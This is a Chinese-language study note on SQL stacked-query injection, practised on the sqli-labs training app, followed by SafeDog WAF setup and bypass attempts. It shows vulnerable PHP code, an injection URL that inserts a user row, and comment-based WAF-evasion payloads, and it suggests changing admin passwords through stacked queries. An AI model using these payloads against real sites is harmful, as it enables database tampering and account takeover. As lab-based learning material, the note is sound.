---
title: "堆叠注入"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/web漏洞/sql注入/堆叠注入/
categories:
  - 网安笔记
  - web漏洞
  - sql注入
  - 堆叠注入
tags:
  - Study
---

### 1、堆叠查询注入

stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。

```
mysql> select * from users; select * from emails;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | 123456     |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | admin'#  | admin      |
+----+----------+------------+
14 rows in set (0.00 sec)

+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.00 sec)

```

修改代码在前台上面显示

```
 46 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 47 echo $sql;
 48 /* execute multi query */^M
 49 if (mysqli_multi_query($con1, $sql))
 50 {
 51     
 52     
 53     /* store first result set */^M
 54     if ($result = mysqli_store_result($con1))
```

执行代码,访问网站

```
http://10.1.1.133/Less-38/index.php?id=1 ';insert into users(id,username,password) values ( 39, 'less38 ', 'hello ')--+
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625387768823-34ccafe0-d9ff-41a2-84c3-5218f364cee8.png)

```
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | 123456     |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | admin'#  | admin      |
| 38 | less38   | hello      |
+----+----------+------------+
15 rows in set (0.00 sec)
```

备注：堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库，但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。

### 2、waf部署

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625389326994-0be8a5eb-af50-4eb1-a2ef-dc29452d2839.png)

WAF部署-安全狗,宝塔等waf搭建部署

相关资源：

堆叠注入

[https://www.cnblogs.com/backlion/p/9721687.html](https://www.cnblogs.com/backlion/p/9721687.html)

安全狗与phpstudy

[https://blog.csdn.net/nzjdsds/article/details/93740686](https://blog.csdn.net/nzjdsds/article/details/93740686)

### 3、部署安全狗

```
[root@oldjiang ~]# wget http://download.safedog.cn/safedog_linux64.tar.gz
```

备注：一般安装的时候可能会提示一些软件没有安装，只需要按照他提示的软件安装上即可。

安装好之后可以在命令提示符中执行以下命令

```
root@37f786327043:/# service safedog start
root@37f786327043:/# service safedog status
safedog service is running
root@37f786327043:/# service safedog stop
-e stop sdsvrd server #/etc/init.d/safedog: 45: [: {1..15}: unexpected operator
root@37f786327043:/# service safedog stop
-e stop sdsvrd server #/etc/init.d/safedog: 45: [: {1..15}: unexpected operator
root@37f786327043:/# service safedog status
safedog serivce is not running
root@37f786327043:/#
```

访问网站后面带一些参数例如`' and 1=1`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627295409800-adf50b24-097d-4b07-965d-2cfe09c6afa4.png)

通过更改数据提交方式，测试后发现上面显示的`Please input the ID as parameter with numeric value` 其实就是因为我们修改的方式是post而服务器接收的是get方法将数据包丢弃，所以出现这样的情况

  

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627297887531-dc02218e-af02-49b0-b832-324932b04a96.png)

**将服务器的提交方式修改为**`**request**`

```
root@37f786327043:/var/www/html/Less-2# head -n 24 index.php |tail -3
if(isset($_REQUEST['id']))
{
$id=$_REQUEST['id'];
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627307927130-9b69e996-8661-494a-8dde-e4fd4e0e660c.png)

获取数据库版本信息被安全狗给拦截

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627308011941-7fa1d8ae-7659-46cb-8f84-308c9fdcc327.png)

绕过思路,这是mysql数据库所特有的

```
mysql> select database/**/();
+-------------+
| database () |
+-------------+
| security    |
+-------------+
1 row in set (0.00 sec)

mysql>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627308466655-c7417869-2340-4129-836d-5efacd70a6c1.png)

**将服务器的提交方式修改为**`GET`

```
root@37f786327043:/var/www/html/Less-2# head -n 24 index.php |tail -3
if(isset($_GET['id']))
{
$id=$_GET['id'];
root@37f786327043:/var/www/html/Less-2#
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627309964477-d1190d70-218c-4bc2-b020-22696c4cf028.png)

原理

```
mysql> select * from users where id=-1/*%0a*/union/*%0a*/select/*%0a*/1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>
```

在看视频操作的时候，由于我部署的是Linux的2.4版本很多的绕过方法都没有成功，下面不在演示，等到复习的时候在深入了解。

相关资源：

[https://www.cnblogs.com/backlion/p/9721687.html](https://www.cnblogs.com/backlion/p/9721687.html)

[https://blog.csdn.net/nzjdsds/article/details/93740686](https://blog.csdn.net/nzjdsds/article/details/93740686)